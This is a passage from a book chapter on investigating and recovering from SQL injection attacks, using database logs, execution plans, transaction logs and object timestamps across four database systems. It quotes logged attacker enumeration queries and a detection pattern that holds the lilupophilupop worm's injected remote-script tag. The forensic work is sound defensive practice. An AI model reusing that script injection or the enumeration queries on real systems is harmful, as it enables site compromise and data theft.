functions developed to access the actual queries stored within. mysql, however, does maintain a general query log that records executed queries in human readable format. this general query log is not enabled by default, however during an investigation you can determine its status using the “show variables” command as follows from your database client: show variables like ‘%general_log%’ the following sample results show the general log is enabled and writing to the c:\\gqlog\\rzmysql.log’ directory on the server: variable_name | value ------------------------ |---------------- general_log | on general_log_file | c:\\ gqlog\\rz-mysql.log the following is a snippet from the log that shows a logged sql injection statement: ... 120116 22:33:16 4 query create database ring0_db 4 query show warnings 1 query show global status 120116 22:33:20 1 query show global status 120116 22:33:2 4 1 query show global status 4 query show variables like ‘%home%’ 120116 22:33:27 1 query show global status 120116 22:33:30 4 query select ∗ from mysql.user limit 0, 1000 120116 22:33:31 1 query show global status 120116 22:33:33 4 query select ∗ from information_schema.routines limit 0, 1000 120116 22:33:34 1 query show global status 120116 22:33:36 4 query select ∗ from information_schema.processlist limit 0, 1000 120116 22:33:38 1 query show global status 120116 22:33:39 4 query select ∗ from information_schema.tables ... postgresql similar to mysql, there is not a native way of viewing the stored execution plans of previously executed queries on postgresql. however, when the log_statement is enabled it will store a record of executed sql queries. the following query can be used to determine if the log_statement value is enabled on a server and if so where the log is located: select name, setting from pg_settings where name in (‘log_statement’, ‘log_directory’ , ‘log_filename’) within the sample results you can see the logs are stored within the default pg_log directory within the postgresql directory structure, and are using the default naming convention: name | setting -------------- |---------------------------------- log_directory | pg_log log_filename | postgresql- %y-%m-%d%h%m%s.log log_statement | mod there are four possible values for log_statement —none, ddl, mod, and all. a setting of mod or higher is required to log enough query information to be truly be neficial in an investigation. viewing the log within a text editor or ms excel will allow you to review a listing of previously executed queries as seen within the following sample results: 2012-01-16 23:14:40 est statement: select ∗ from pg_trigger ... select ∗ from pg_tables select ∗ from pg_user select ∗ from pg_database select pg_read_file(‘pg_log\\ postgresql -2012-01-14_103156.log’, 0, 200000); ... as beneficial as execution plans are during an investigation there are limitations that are important to also u nderstand. execution plan limitations although they are indispensable, database execution plans have associated limitations that affect their usefulness within an investigation. aside from being disabled by default in postgresql and mysql, they can be disa bled by an attacker with sufficient permissions. microsoft sql server and oracle prevent the disabling of execution plans, however plans are subject to local rdbms eviction policies and can be flushed using special rdbms functions. cache eviction policies control the size of execution plan cache stores. policies purge cache entries in response to multiple factors the most notable being: • cpu and memory load on the database server. • the frequency of plan reuse. • modification of an object referenced within a cached execution plan. • restart of the database services. despite defined eviction policies some rdbms’s will actually retain plans left by sql injection attacks for an extended period of time. one example of this is microsoft sql server, which will ca tegorize queries using statements such as waitfor, in, union and comparison operators like 1=1 as complex. complex statements require additional processing for microsoft sql server to create associated execution plans and retain them longer to avoid having to recreate these complex execution plans. oracle, mysql and postgresql however do not favor caching of complex execution plans. for a complete list of factors affecting cached execution plans you should consult vendor documentation and ensure you are fam iliar with them as you prepare for an investigation. manual cache flushes can be used by a user with administrator privileges to flush database execution plan caches. within microsoft sql server specific execution plan caches and even specific entries can be flushed, whereas in oracle it is a little less granular only allowing the flush of the cache in its entirety. you should refer to vendor documentation for the specific database functions that can flush the execution plan cache. a final limitation we will look at is parameterization. in chapter 8 , we looked at using parameterized queries to help prevent sql injection vulnerabilities. within the rdbms parameterization takes on another context and is the process used to replace literal values within an execution plan with variables. this process is performed to increase the likelihood of the rdmbs reusing the cached pan to satisfy future queries. an example of this is the following query: select employeeid, fname, lname, yob from ssfa.employee where [fname]= ‘mike’ database servers can cache the preceding statement as you see it in its raw format, or may parameterize it which would force the caching of the following in replacement of the originally executed query: (@1 var char(8000))select [employeeid],[fname],[lname],[yob] from [ssfa].[employee] where [fname]=@1 parameterization complicates an investigation due to the fact that the rdbms can replace the sql injection attack payload with a variable within the execution plan . there is no publicly released method to translate the variable back to the raw literal values which lessens the benefit of parameterized execution plans during an investigation. in these cases knowing that activity occurred within a database object at a given date/time will support development of an investigation timeline of events. the plan cache will outline the statements executed on a server, however will not provide you the user context used to execute it. analyzing the plan cache in conjunction with the transaction log can point you in the right direction. transaction log the sql language consists of several sub- elements such as clauses, queries, and statements. to dig a little deeper (but not too deep) a statement includes one or more database opera tions. the two main categories of operations are data manipulation language (dml), which affects data within a table, and data definition language (ddl) operations that affect the structure of database such as creating a new table. a transaction log is use d to record the fact that a transaction is set to occur as well as the information needed by the database server to recover the data back to a consistent state in event of a sever failure while it is writing information to disk. changes to the actual datab ase data pages don’t happen in real -time. at predefined intervals information from the transaction log is later applied to disk in coordinated data writes that are better for overall performance. this may sound convoluted, however the write to the transact ion log is much quicker than the rdbms seeking and writing information to the appropriate areas in large database files. there are several unique database operations that can be logged within a transaction log however under the hood of a database almost al l operations, regardless if they are classified as dml or ddl, all boil down to insert, update, and delete operations which are used when information needs to be written, updated, or deleted from disk. sql injection attacks almost always leave traces within the database transaction log, whether the attack included the direct modification of information within a table or not. even in the case when an attacker executes a select statement, the associated where expression may force the rdbms to create a temporary table to sort interim results before returning them back to the attacker. this would result in the creation of several transaction log entires associated with the creation of the temporary table and loading of the interim select results. what to look for transaction log analysis is a very detailed topic that would extend beyond the scope of this book. therefore we will focus on a few key transactions that will support your investigation. in summary, transaction logs should be reviewed for the following: 1. insert, update, and delete statements executed within the timeframe of a suspected attack. this information can be used to identify activity performed during the timeline of an investigation as well as allow the correlation of events with other artifacts. 2. non-standard database operations performed by a database user (where applicable). an example of this would be an application user account that routinely reads information from the database and abruptly begins executing insert, update and delete opera tions. we will now step through how to search the transaction logs of popular rdbms and look at some malicious uses of statements and functions captured in table 10.3. microsoft sql server the microsoft sql server transaction log is enabled by default and cannot be disabled. the native fn_dblog function can be used from any sql server client to access it. two native clients that ship with the retail version of ms sql server are sqlcmd a command line client and the traditional sql server management studio gui. the following is a query that is helpful and shows a summary of transactions executed against user tables: select allocunitname as ‘object’, operation, count(operation) as ‘count’ from fn_dblog(null,null) where operation in (‘lop_insert_rows’, ‘lop_modify_row’, ‘lop_delete_rows’) and allocunitname not like ‘sys.%’ group by operation, allocunitname order by object, operation sample results are shown in figure 10.2. figure 10.2 sample quer y results containing microsoft sql server transaction log summary the unkown alloc unit entries within the results signify that the object referenced by the transactions has since been deleted. the high count of lop_modify_row and lop_insert_rows tells us that 460 rows of information were inserted into a table, updated 330 times. if this is contrary to expected application activity, this would be suspect and may be the indicator of sql injection attack related activity and should be flagged for further anal ysis to reconstruct the actual data inserted, modified, and deleted. a second query that is useful is database scoped and will return a listing of all insert, update, and delete operations in addition to a few additional operations often associated with sq l injection attacks as captured within the query: select tlg.spid, tlg.[transaction id], case when (select name from sys.server_principals lgn where rtrim(lgn.sid) = rtrim(tlg.[transaction sid])) is null and (select distinct name from sys.database_principals lgn where rtrim(lgn.sid) = rtrim(tlg.[transaction sid])) is null then ‘[unknown sid]: ’ + convert (varchar(max), [transaction sid]) else case when (select name from sys.server_principals lgn where rtrim(lgn.sid) = rtrim(tlg.[transaction sid])) is not null then ‘login: ’ + upper((select name from sys.server_principals lgn where rtrim(lgn.sid) = rtrim(tlg.[transaction sid]))) else ‘db user: ’ + upper((select name from sys.database_principals lgn where rtrim(lgn.sid) = rtrim(tlg.[transaction sid]))) end end as ‘login_or_user’, tlg.[transaction name] as ‘transaction type’, tlg.[begin time] from fn_dblog(null, null) tlg where cast ([begin time] as datetime) >= ‘2011-01-01’ and cast ([begin time] as datetime) <=‘2012- 07-29’ and [transaction name] in (‘insert exec’, ‘drop obj’, ‘create table’, ‘insert’, ‘update’, ‘delete’, ‘drop user’, ‘alter table’, ‘alter user’, ‘user transaction’, ‘bulk insert’, ‘creatproc transaction’)order by [begin time] desc, [transaction id], user, [transaction type] sample results are sh own in figure 10.3. figure 10.3 sample query results containing mic rosoft sql server transaction log summary as you can see by the preceding results there are multiple columns of information. an explanation of each data entity is as follows: spid: the unique session identifier assigned to the connection who executed the l ogged transaction. transaction id: a unique identifier used by the rdbms to group multiple related operations together. login_or_user: the database server login or database user account that executed the transaction. transaction type: a description of the type of transaction executed. begin time: the time the transaction was executed. the preceding query will allow you to see database operations by database user account. within the results you can see several tables are created and the exec command is used to insert data into a table. this should be treated as highly suspect, especially noting that the activity was performed by what looks like an application account. this activity should be taken to a database administrator to confirm its legitimacy. oracle on oracle the transaction (archive) log is enabled by default and can’t be disabled on test systems. the following query can be used within oracle to return a list of executed insert, update, and delete operations: select operation, sql_redo, sql_undo from v$logmnr_contents where seg_owner = ‘webapp’ and seg_name = ‘syngress’ and (timestamp > sysdate - 1) and (timestamp < sysdate) and operation in (‘delete’, ‘insert’, ‘update’) and username = ‘kevvie’; sample results are as follows: ... delete from “webapp”.“syngress” where “a” = ‘80’ and “b” = ‘three’ and “c” = to_date(‘23jan-12’, ‘dd- mon-rr’) and rowid = ‘aaatcpaaeaaaaiuaad’; insert into “webapp”.“syngress”(“a”,“b”,“c”) values (‘80’,‘three’,to_date(‘23- jan-12’, ‘ddmon-rr’)); ... mysql the transaction log in mysql is not enabled by default and must be enabled in order to log transactions. to determine if the transaction log is active you can use the “show binary logs” statement: show binary logs; if binary logging is disabled you will rec eive an error stating “you are not using binary logging”. if it is enabled the name of all logs will be returned as seen in the following: log_name | file_size ----------------------------------- db_bin_logs.000001 | 1381 db_bin_logs.000002 | 4603 db_bin_logs.000003 | 126 db_bin_logs.000004 | 794 db_bin_logs.000005 | 126 db_bin_logs.000006 | 221 db_bin_logs.000007 | 107 when logging is configured the first mysql transaction logs will have the extension ∗.000001 and increment each time the server restarts, t he log reaches a predetermined size, or is flushed. to determine where the logs are stored you can use the following query: show variables like ‘%home%’ the innodb_log_group_home_dir value within the results is the location of the log files. within the fol lowing sample results the logs are stored within the mysql root directory (. \\): variable_name | value ---------------------------| ---------------- innodb_data_home_dir | innodb_log_group_home_dir | .\\ to dump a list of transactions from the transaction log you can use the native mysql mysqlbinlog utility on non- windows servers, and the mysql command line client for windows. the following query example shows how to return a list of all transactions recorded within the db_bin_log.000002 file: mysqlbinlog “c:\\ program files\\ mysql\\db_bin_logs.000002” > z:\\ transactionlog.txt sample results are as follows which show the previously executed statements recorded in the logfile in human readable form: begin /∗!∗/; # at 4155 #120114 0:30:34 server id 1 end_log_pos 4272 query thread_id=16 exec_time=0 error_code=0 use world/ ∗!∗/; set timestamp=1326519034/∗ !∗/; update city set name = ‘ashburn’ where name = ‘kabul’ /∗!∗/; # at 4272 #120114 0:30:34 server id 1 end_log_pos 4342 query thread_id=16 exec_time=0 er ror_code=0 set timestamp=1326519034/∗ !∗/; commit /∗!∗/; # at 4342 #120114 0:30:52 server id 1 end_log_pos 4411 query thread_id=16 exec_time=0 error_code=0 set timestamp=1326519052/∗ !∗/; begin /∗!∗/; # at 4411 #120114 0:30:52 server id 1 end_log_pos 4514 query thread_id=16 exec_time=0 error_code=0 set timestamp=1326519052/∗ !∗/; delete from city where name = ‘ashburn’ /∗!∗/; # at 4514 #120114 0:30:52 server id 1 end_log_pos 4584 query thread_id=16 exec_time=0 error_code=0 set timestamp=1326519052/∗ !∗/; commit /∗!∗/; delimiter; # end of log file rollback / ∗ added by mysqlbinlog ∗ /; /∗!50003 set completion_type=@old_completion_type∗ /; postgresql the postgresql command line client can be used to return transaction log information. in postgresql the transaction log is not enabled by default and when enabled it can be disabled. further in recent versions of postgresql there are unlogged tables which do not write associated insert, udpate, and delete operations to the transaction log regardless of whether the log is enabled or disabled. due to these limitations it is better during an investigation to leverage the postgresql statement log to identify tr ansactions of interest including those from unlogged tables. for guidance on how to access the statement log you can refer to the postgresql example within the execution plan section of this chapter. as great as transaction logs are during an investigation they as well do have their limitations. they are highly configurable which ultimately determines how much information is logged within them and the lifespan of the information before it is overwritten. transaction log information can last anywhere from mi nutes to months to indefinitely. transaction log retention and logging does have material differences between rdbms platforms and it is recommended you consult vendor documentation to obtain additional information about them. database object time stamps recent databases mimic operating systems, from dedicated memory management to running their own virtual operating system to manage memory and processes. also similar to operating systems most rdbms products also maintain timestamp information on objects and files created and modified within its structure. during an investigation, generating a listing of key objects and associated timestamps is a good way to for you to identify object creation and modification activity during the timeframe of a suspected attack. when investigating a suspected sql injection attack pay close attention to the following activity commonly associated with an attack: • user account creation which is often used to create backdoor access. • addition of privileges to existing accounts commonly performed as part of privilege elevation. • creation of tables which are often used to store interim results before they are returned to an attacker. the following is an example of queries that can be run to return timestamp information from microso ft sql server, oracle, mysql, and postgresql. sql server the following query will return a listing of views, procedures, functions, tables, and extended procedures within in the current database ordered by modification and creation date both in descending order: (select sob.name as ‘object’, sch.name as ‘schema’, type_desc, create_date, modify_date from sys.all_objects sob, sys.schemas sch where sob.schema_id = sch.schema_id and sob.type in (‘v’,‘p’, ‘fn’, ‘u’,‘s’, ‘it’,‘x’)) union (select name, ’’, ‘db_user’, createdate, updatedate from sys.sysusers) union (select name, ’’, ‘login’, createdate, updatedate from sys.syslogins) in the following sample results the table name !nv!s!ble should be treated as suspect due to the unusual table name, especially if it was created or modified during the timeline of an attack (see figure 10.4). figure 10.4 sample query results containing microsoft sql server object timestamps oracle the following query can be used within oracle to return a listing of database objects types such as tables, views, and procedures within the current database ordered by modification and creation date both in descending order: select object_name, object_id, object_type, created, last_ddl_time from dba_objects order by last_ddl_time desc, created desc; sample query results are shown in figure 10.5. figure 10.5 sample query results containing oracle object timestamps mysql when working with mysql it should be noted that timestamps aren’t stored for some objects such as triggers and views. when the following query is run obje cts not associated with timestamps will be returned as null: select ∗ from ( (select table_name as “object”, table_schema as “object_schema”, table_type as “object_type”, create_time, update_time from information_schema.tables) union (select specific_name, routine_schema, routine_type, created, last_altered from information_schema.routines where routine_type = ‘procedure’) union (select user, ’’, ‘db_user’, ’’, ’’ from mysql.user) )r sample results are shown in figure 10.6. figure 10.6 sample query results containing mysql object timestamps due to the fact some obje cts aren’t associated with timestamps it is recommend you also review the results for entries that don’t following the server’s naming convention. postgresql postgresql does not record timestamp information for created objects, tables, users, etc. however the following query can be run to return the name, schema, and type of key objects within the current database. you can review the names for irregular object names, which should be treated as suspect and qualified by a system database administrator : select proname as “object_name”, ’’ as “object_schema”, ‘procedure’ as “object_type” from pg_proc union all select tgname, ’’, ‘trigger’ from pg_trigger union all select tablename, schemaname, ‘table’ from pg_tables union all select usename, ’’, ‘user’ from pg_user sample results are shown in figure 10.7. figure 10.7 sample query results containing a postgresql database object listing this concludes our review of some key artifacts that hold evidence needed to confirm or discount the occurrence of a successful sql injection attack. it is my hope that you have discounte d a suspected attack, however in the event you have found evidence to the contrary we’ll take a look at the critical actions you must perform to effectively contain and recover from a sql injection attack. so, you’re a victim —now what? there is an age- old saying “be careful what you look for you just might find it”. a security incident definitely falls in line with this adage. security incidents are stressful as you try and piece together what happened and who is at fault for the compromise. they can also b e exciting as you solve the question of “who has done it” and “how did they do it”? as much as you may want jump right into the exciting areas of an incident it is imperative that an orderly and well -structured process is followed from beginning to end to ensure minimal impact to an organization. most organizations today have computer emergency response processes already defined or, depending on the nature of information involved in the incident, standards such as the payment card industry (pci) data securi ty standard (dss) may govern the steps you are required to perform to manage and contain an incident. the processes we are about to cover will provide specific steps to follow during the management of a security incident, however these steps are not intended to replace your organizational incident response processes, or mandated regulatory requirements, alternatively, they should be used as a guideline that can be applied in support of your required incident response processes. the first step in recovering from a sql injection attack is to effectively “stop the bleeding” and contain the incident. containing the incident when managing a sql injection incident it is imperative to achieve efficient and effective containment. the longer a sql injection vulnerabi lity remains exposed the greater the possibility of additional records being compromised or an attacker increasing his foothold into an environment. this all boils down to the quicker you can contain an incident, the smaller the impact is to an organizatio n. the objective of containing an incident that has not yet been fully scoped may seem incredibly difficult, however it is necessary and not impossible. when dealing with an incident containment steps need to be planned with the details you have. it is better to stop the bleeding at the onset and then, if need be, revisit your containment measures when you conclude your full investigation. to contain a sql injection incident you can simply unplug the network cable from compromised servers. although a sql injection attack directly targets the database server, depending on an attacker’s actions and network- based controls (such as firewall rules on database traffic) they may have been able to export database data to another connected server for external transfe r. in this scenario it could still be downloaded by the attacker if just the database server is removed from the network. it’s better to remove both database and associated web servers from the network by unplugging their network cables. it is imperative that you do not unplug the power cables from the systems or stop and restart the web or database services as this will force the purging of volatile data which can be critical in a full forensic investigation. you should also ensure to record which network cable was unplugged from which system at what time. after the incident is contained you can move on to determining the data involved which will drive future steps in the management of the incident. assessing the data involved databases can hold a variety o f information. some of this database content can be simple public information, but other content can include sensitive data ranging from personal information that can be used for social engineering attacks, to financial and health information that can be u sed for fraud. unfortunately it doesn’t stop there. there are other types of information that carry an even higher risk—loss of human life. for example if a list of identities and locations of undercover agents or citizens on the witness protection program was disclosed this could greatly threaten their personal safety. determining the type of data involved in an incident will allow your organization to determine the steps required to manage it. some of these steps may include meeting applicable regulatory and legislative requirements that will affect how you manage the incident and who you notify about it. you should be sure to review the nature of data stored, processed, or transmitted by compromised systems: • the type of information involved. • if the in formation is identifiable to an individual or organization. • country and state or province of affected individuals. • what action was performed on the data (updated, deleted, corrupted, disclosed). • impact of unauthorized data reuse. • any mitigating con trols such as data encryption that would lower the likelihood of the information being reused by unauthorized individuals. the previous points will help you pinpoint the criticality of the information, which will help determine required actions including who you need to notify about the incident. notifying the appropriate individuals many states and provinces around the world have rules that require organizations entrusted with managing personal information to notify individuals affected by a data security breach. specific requirements vary from state to state and province to province and are dependent on where the affected ind ividual resides. in addition, contractual requirements with clients and regulations such as pci dss, which mandate disclosure of breaches affecting credit card information, can impose further notification requirements in the event of a breach. as you can s ee figuring out who should be notified is a difficult task that may include reviewing legally binding contracts, statutes, and regulations. this task is one best left with the victim organization’s senior management and legal counsel. they will make the business decision as to what requirements apply, the notification that needs to be sent, the messaging, and who is best equipped to manage it. this approach also frees incident handlers and forensics professionals to focus on the technological aspects of the incident such as determining the actions performed by the attacker during the incident. determining what actions the attacker performed on the system earlier when confirming a sql injection attack we looked at some key artifacts to identify malicious statements and queries that were successfully executed by the database server. this allowed us to conclude if there was a successful attack, however it is not sufficient to just know that an attack has occurred— you should also determine the scope of the breach. knowing the executed query or statement is a start but knowing the specific records that would have been disclosed or modified allows you to narrowly scope the incident. when considering the notification requirements we just reviewed, being able to discount the disclosure of credit card details or individual’s personal information can reduce the overall cost of recovery as well as total impact experienced by the victim organization. this feat is best managed by executing a database forensics investigation . database forensics focuses directly on the identification, preservation, and analysis of evidence that can scientifically prove an incident has occurred and to properly scope it by: • identifying the information viewed by the attacker. • identifying the dml and ddl operations performed by the attacker and the specific records affected. • identifying the state of affected data records pre- and post -transaction to support recovery. • recovering previously deleted database data. database forensics is a very specialized discipline involving low level operations such as analyzing specific data pages used to store database table data and reverse engineering information from the transaction log. this is out of scope for this book however the references listed in table 10.5 can be used for additional database forensics related information and tools. tools and traps in 2009 a leading anti -virus company was the target of a sql injection attack. the attacker had made claims that he exploited a sql injection vulnerability within the vendor’s website and stolen sensitive information about the vendor’s customers. the vendor sought the expertise of a database forensics expert who was able to confirm the attacker did successfully compr omise the website via a sql injection vulnerability however the attacker did not access the data claimed. this investigation was able to successfully scope the incident and by doing this reduced the recovery cost and overall impact to business. further det ails can be read on the vendor website.i table 10.5 database forensics resources with an understanding of the benefit of a database forensics investigation to properly scope a breach we will move on to the actions required to effectively recove r from one. recovering from a sql injection attack in previous chapters we reviewed multiple sql injection exploitation techniques such as time -based and error -based injections, automated injection tools, worms, and payloads such as stealing information or escaping form the database and running os level commands. there are a multitude of combinations that can be used in an attack and these combinations will ultimately determine how you recover from the attack. the first step in recovery is determining what type of payload was delivered by the successful attack: static payload: the actions performed post -compromise are consistent from compromised system to compromised system. static payloads are commonly associated with sql injection worms and scripts that ar e not polymorphic in nature. they will repeat the same actions each time they identify and exploit a sql injection vulnerability. dynamic payload: the actions performed post -compromise are not likely to be consistent from compromised system to compromised system. an example of this would be an attacker who exploits a sql injection vulnerability using an exploitation tool. once the attacker gains access he will enumerate the database and depending on the database server version, enabled features, and the privileges he currently has he can execute any number of actions within the rdbms. even if the attacker used the same tool to compromise multiple serv ers the actions he performs are highly likely to be different between compromised systems depending on his privileges, the database server configuration, and information he is after. with the two types of payloads an attack can yield outlined we will now l ook at how you can determine what payload an attack carried. determining the payload of an attack the steps needed to determine the payload of an attack may affect volatile database evidence. if you are proceeding with a database forensics investigation there are several database artifacts outside of what we have reviewed in this chapter that should be preserved prior to continuing. you can refer to section “determining what actions the attacker performed on the system” within this chapter for additional gu idance. the following steps can be executed to identify the payload of a successful attack: 1. backup the victim database: make two copies of the victim database. one will be recovered and the other will serve as a clean recovery point in event of recovery issue. 2. extract malicious sql injection queries: create a single list of unique malicious queries and statements extracted from web server logs, database execution plans, and statement and binary logs for compromises involving mysql and postgresql database servers. 3. comprehend malicious query logic: review the malicious query and statement listing and determine the objects created, accessed, updated, or deleted and how the attacker accomplished this. you will need this to determine the scope of the inc ident and later to plan required incident recovery steps. note that some malicious queries may have been obfuscated to avoid detection and you will need to convert them into human readable form. for additional details on this refer to the “evading input fi lters” section in chapter 7 . 4. search for references to the malicious queries: you may have a listing of known malicious statements and commands that you can use to cross -reference against your list of malicious queri es to identify their source. if you do not have a list of known bad queries you can use your internet search engine of choice to search for references to the previously identified malicious queries. as rudimentary as it sounds when you identify a successful sql injection attack, odds are there are other customers who have fallen victim to it or write -ups from security companies and researchers on the attack that you can leverage. 5. determine if the malicious queries identified are part of a static or dynam ic payload: from your search results determine if the attack activity is associated with static payloads such as sql injection worms or dynamic payloads traditionally delivered ad- hoc by an attacker using an sql injection exploitation tool. 6. look for mul tiple exploitations: it’s important that you check all entries in your malicious query list as it’s possible the same sql injection vulnerability was exploited multiple times using both static and dynamic payloads. identification of any single dynamic payl oad should be the high -water mark regardless of how many static payloads you may detect. after completion of the preceding steps you should be able to conclude if the sql injection attack carried a dynamic or static payload. this conclusion will determine the recovery actions you will need to perform. in the following section we will walk through recovery of attacks carrying static payloads as well as those with dynamic payloads. in event of an actual incident you should pick and follow only the appropriate one, static or dynamic recovery. recovering from attacks carrying static payloads attacks with static payloads have a relatively straight forward recovery process as the malicious actions performed by the worm or other threat is known. the core focus is r olling back the database to before the infection, or identifying and undoing the specific operations performed by the execution of the malicious queries and statements. the following steps will walk you through static payload recovery: 1. restore database state: restore affected databases to a known good state using one of the following methods: a. restoring from backup: using the attack timeline identified during artifact analysis you can restore affected databases to known state immediately before the com promise. it should be noted that this may result in the loss of transactions that occurred from your known good state up until the time of incident containment. b. identify transactions to be rolled back: whether manually or by using a log analyzer such as logminer for oracle, identify the transactions associated with the attack payload to be rolled back. the lilupophilupop worm is an example of a worm that delivers a static payload which searches tables for columns suitable to hold malicious code that it w ill ultimately write to them. the following is an example of a query that searches the microsoft sql server transaction log for transactions carrying the payload delivered by the lilupophilupop worm: select [transaction id] as ‘transaction_id’, [operation] , [allocunitname] as ‘table’, [page id] as ‘page’, [slot id] as ‘record_id’, [offset in row] as ‘record_offset’ from fn_dblog(null,null) where convert(varchar(max), [rowlog contents 1]) like ‘%</title><script src=“http://lilupophilupop.com/sl.php”%’ and [operation] = ‘lop_modify_row’ or convert (varchar(max), [rowlog contents 0]) like ‘%</title><script src=“http://lilupophilupop.com/sl.php”%’ and [operation] = ‘lop_insert_rows’ or convert (varchar(max), [rowlog contents 4]) like ‘%</title><script src=“http: //lilupophilupop.com/sl.php”%’ and [operation] = ‘lop_modify_columns’ the preceding query converts the hex -based transaction log values into character format and compares it to a fragment of the worm payload. the following results show the transactions executed by the worm to write its payload to database tables. sample results are as follows (see figure 10.8): the preceding information can be used to identify the transactions that need to be reversed. you can manually create undo scripts for the transaction or use log reader tools such as apexsql for microsoft sql server and other rdbms products or logminer which is a free tool released by oracle to rollback oracle transactions. the following is a screen capture of transaction browsing using oracle logminer (see figure 10.9): within the preceding image pressing the “flashback transaction” button will roll back the transaction seamlessly in oracle 11g and higher. more information ca n be obtained from the oracleflash website . ii figure 10.8 sample query results containing microsoft sql server transactions executed by the lilupophilupop worm figure 10.9 screen capture of transaction browsing using oracle logminer 2. verify database server configuration: if the static payload included enabling frequently targeted rdbms features or loosening the configuration of the server to further the attack you should restore the database server configuration to a known good state. regardless if you restored a victim database from backup or manually rolled back transactions, any server wide configuration settings changed during the attack will remain until you explicitly identify and reverse them. you should audit server configuration settings and ensure they are in line with the intended configuration. 3. identify and fix the sql injection vulnerability: ensure an application security assessment of the entire code base is performed to identify the exploited vulnerability as well as o ther instances that may exist. 4. bring the system back on -line and restore web services. recovering from attacks carrying dynamic payloads attacks carrying dynamic payloads are the most difficult to recover from because the actions of the attacker can vary greatly with each compromise. if a sql injection attack was launched over http post requests, most webservers are not configured to log this activity. further if there has been a large amount of time between compromise and the investigation, execution plans and other evidence may have been overwritten. another complexity is that an attacker may escape the database into the operating system, establish an out -of-band connection directly to the compromised server and bypass the database altogether as he continues to exploit. in cases of successful attacks carrying dynamic payloads it is highly recommend that you engage a database forensics exper t to perform the investigation. there are good sources to learn database forensics available online, however there is no substitute for experience. an expert has a far greater chance of narrowly scoping and recovering from an incident. that being said the following steps can be followed: 1. restore database state: the recommend approach to recover from sql injection attacks with dynamic payloads is to restore both the rdbms and the operating system to its state prior to the compromise. it should be noted that this may result in the loss of transactions that occurred from your known good state up until the time of incident containment. you may elect to not proceed with the recommended approach of restoring the database and operating system. in these instances you can follow the restoring database state process captured under the static payload recovery section. however, be forewarned that depending on the lapse of time between the attack and investigation artifacts may have been partially overwritten and may n ot accurately capture all actions and activities performed by an attacker on the system. due to this, static payload recovery steps may not fully restore the server to a clean state and attackers may still maintain control over your server and/or networked devices post -recovery. use extreme caution and act at your own risk. 2. identify escaped database activity: within the listing of malicious queries you earlier generated you should identify statements that allowed the attacker to escape from the database server to the underlying operating system file system or registry. if operating system activity is identified you should perform the following: a. look for the creation of any out -of-band communication methods such as creating operating system user account s that could have been used for the attacker to further the attack outside of the database. b. look for references to files within the operating system or registry keys that were read, created or loaded into the database by the attacker. ensure to forensic ally preserve the files and or registry keys and then review a copy to gain an understanding of what the attacker did. this analysis may be able to identify other out -of-band connection methods such as uploading a malicious file to a table via a sql injection vulnerability and then exporting it and rebuilding it on the victim. c. review network logs to identify communication from the database server to other networked machines. if suspicious activity is observed you should investigate associated hosts as we ll for compromise. 3. verify database server configuration: once an attacker gains access to database server he will likely loosen security if present to further his foothold on the server. restoring a victim database to a known good state may not eliminat e back doors an attacker may have created such as a rdbms login. an audit should be performed on the server to ensure existing server settings remain in their expected state. 4. identify and fix the sql injection vulnerability: ensure an application securi ty assessment of the entire code base is performed to identify the exploited vulnerability as well as other instances that may exist. 5. bring the system back on -line and restore web services. summary defense is defined by dictionary.com as “the resistance against danger, attack, or harm.” traditional sql injection defenses such as secure coding practices, web application firewalls, and vulnerability assessment programs are effective measures that will reduce the likelihood of an organization experiencing a sql injection -related breach. with the cat and mouse nature of information security, security professionals will continue to defend against attacks however hackers will continue to adapt and attack in an effort to circumvent defenses. this cycle will continue and it is inevitable that organizations with web -based applications will be faced with investigating sql injection attacks. keeping this in mind as we revisit our defense definition, danger, attack, or harm can also fall upon an organization that cannot efficiently respond to and discount a suspected sql injection attack or narrowly scope and recover from a successful attack to minimize impact to business. you can create a holistic sql injection defense strategy by using the investigation, containment, and recovery practices outlined in this chapter to augment traditional defense measures. only with this holistic strategy can you protect an organization by defending it before, during, and after a sql injection attack. solutions fast track investigating a suspected sql injection attack: • investigations should only be performed by computer security incident responders and forensics professional authorized to perform investigations within an organization. required forensically sound practices: • a true bit -for-bit copy should be made on all files gathered during an investigation. • a hash should be generated on each copied file and compared against a hash of the original to verify the integrity of the bit -for-bit copy. • document all actions performed during your investigation including all queries executed against an rdbms and the returned results. • ensure all gathered files are written to sterile storage media and stored in a secure location. • maintain chain of custody for all collected evidence. analyzi ng digital artifacts: • digital artifacts are collections of related data. • artifacts most beneficial in a sql injection attack investigation are web server log files, database execution plans, the transaction log and database object timestamps. identifying sql injection attack activity: • perform a broad analysis of web server log files looking for dates with abnormally high number of web requests or bandwidth usage between the web server and client computers. • review database execution plans an d associated logs for malicious queries. • review transaction logs for suspicious activity that occurred during the timeframe of an attack paying close attention to executed insert, update, and delete statements. • database object timestamps should be revi ewed to identify user account creation, privilege escalation, and the creation of tables. confirming if a sql injection attack was successful: • the following discoveries confirm a successful sql injection attack: • sql injection activity captured within d atabase execution plans or associated database logging. • unauthorized transactions, object creation, or modifications. containing the incident: • unplug the network cable from compromised database and associated web servers. assessing the data involved: • data must be assessed to ensure your organization can determine applicable regulatory and legislative requirements. notifying the appropriate individuals: • notification of a breach should be managed by the victim organization’s senior management and lega l counsel. determining the actions the attacker took on a system: • database forensics can be used to determine the specific actions performed by the attacker during the attack. determining the attack payload: • backup the victim databases. • extract malic ious sql injection queries. • review and comprehend malicious query logic to gain an understanding of what the payload is attempting to accomplish. • search for references to the malicious queries. • determine if the identified malicious queries are part o f a static or dynamic attack payload. • look for multiple exploitations. • attacks should be classified as carrying either a static or dynamic payload. • the attack payload will determine how the incident is recovered. recovering from a sql injection attack: • restore the database to a known good state. • verify database server configuration. • identify and fix the sql injection vulnerability. • bring the system back on- line and restore web services. frequently asked que stions q: what happens if someone who isn’t forensically trained or authorized to conduct an investigation performs one? a: any unauthorized individual who performs an investigation, whether they are forensically trained or not, can be faced with legal rep ercussions. further they may invalidate evidence, and discoveries that result from this evidence may not be admissible in a court of law or be accepted for use within formal proceedings within a corporation. q: what is a polymorphic sql injection worm? a: a polymorphic sql injection worm is one that mutates and changes as it infects. these worms are specifically designed to dynamically change to avoid signature- based detection mechanisms. at the time of this writing there are no known polymorphic sql inject ion worms, however they are expected to surface within the near future. q: do i have to use the database clients referenced in this book to perform an investigation? a: no, you can use any trusted database client obtained from a reliable source as long as it can log its actions while it connects to, and queries an rdms. further, the client will need to have the ability to redirect stdout to a file to preserve the results of your queries. q: can i use the rdbms query editor to conduct an investigation instea d of using a database client? a: it is not recommended to use an application running on a victim system to conduct an investigation. rdmbs and or operating system files may have been tampered with during an attack which can result in skewed results to your queries. you should use a 